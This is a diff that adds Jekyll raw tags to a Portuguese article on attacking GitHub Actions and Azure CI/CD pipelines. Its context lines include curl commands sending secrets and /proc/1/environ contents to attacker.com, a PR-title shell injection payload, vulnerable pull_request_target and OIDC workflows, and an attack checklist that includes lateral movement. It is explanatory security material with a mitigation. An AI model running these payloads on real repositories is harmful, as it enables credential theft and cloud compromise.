@@ -81,6 +81,7 @@ permissions:
 
 Secrets nunca devem aparecer em logs, mas erros de configuração expõem isso:
 
+{% raw %}
 ```yaml
 # VULNERÁVEL: imprime secret em log
 - name: Debug credentials
@@ -97,6 +98,7 @@ Secrets nunca devem aparecer em logs, mas erros de configuração expõem isso:
     tenant-id: ${{ secrets.AZURE_TENANT_ID }}
     subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
 ```
+{% endraw %}
 
 **Técnica de exfiltração via encoding para burlar mascaramento:**
 
@@ -116,6 +118,7 @@ curl "https://attacker.com/exfil?d=$(echo $SECRET | base64 | tr -d '\n')"
 
 O trigger `pull_request_target` executa no contexto do repositório **base** (não do fork), com acesso total a secrets. Foi criado para permitir que PRs de forks adicionem comentários e labels, mas quando mal usado abre injeção de código:
 
+{% raw %}
 ```yaml
 # VULNERÁVEL: trigger perigoso + checkout do PR
 on:
@@ -140,6 +143,7 @@ jobs:
         with:
           client-id: ${{ secrets.AZURE_CLIENT_ID }}
 ```
+{% endraw %}
 
 **Fluxo de ataque:**
 1. Atacante faz fork do repositório alvo
@@ -172,6 +176,7 @@ urllib.request.urlopen(
 
 Dados controlados pelo atacante injetados diretamente em comandos shell:
 
+{% raw %}
 ```yaml
 # VULNERÁVEL: título do PR usado em comando shell
 - name: Check PR title
@@ -179,9 +184,11 @@ Dados controlados pelo atacante injetados diretamente em comandos shell:
     echo "PR title: ${{ github.event.pull_request.title }}"
     # Atacante nomeia PR: "; curl https://attacker.com/$(cat /proc/1/environ | base64)"
 ```
+{% endraw %}
 
 **Mitigação correta — uso de variável de ambiente intermediária:**
 
+{% raw %}
 ```yaml
 - name: Check PR title (seguro)
   env:
@@ -189,6 +196,7 @@ Dados controlados pelo atacante injetados diretamente em comandos shell:
   run: echo "PR title: $PR_TITLE"
   # $PR_TITLE é tratado como dado, não como código shell
 ```
+{% endraw %}
 
 ---
 
@@ -432,6 +440,7 @@ GitHub Actions                 Entra ID (Azure AD)
 
 ### Configuração Legítima (para referência)
 
+{% raw %}
 ```yaml
 # App Registration no Azure com Federated Credential configurada para:
 # Issuer: https://token.actions.githubusercontent.com
@@ -454,6 +463,7 @@ jobs:
           subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
           # Sem client-secret! Usa OIDC automaticamente
 ```
+{% endraw %}
 
 ### Abuso de OIDC — Condições para Exploração
 
@@ -504,6 +514,7 @@ curl -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
 
 ### Ataque Completo: OIDC via pull_request_target
 
+{% raw %}
 ```yaml
 # Workflow vulnerável em repositório público com OIDC configurado
 on:
@@ -530,6 +541,7 @@ jobs:
       
       - run: npm test  # Executa código do fork com token Azure válido!
 ```
+{% endraw %}
 
 **Payload no fork (package.json):**
 
@@ -626,6 +638,7 @@ AADServicePrincipalSignInLogs
 
 ## Checklist de Ataque CI/CD Azure
 
+{% raw %}
 ```
 RECONHECIMENTO
 [ ] Identificar repositórios com workflows .github/workflows/
@@ -647,6 +660,7 @@ PÓS-COMPROMETIMENTO
 [ ] Mover lateralmente para outros recursos ARM ou Entra ID
 [ ] Verificar se SP tem permissões de Graph API (User.ReadWrite.All, etc.)
 ```
+{% endraw %}
 
 ---
 
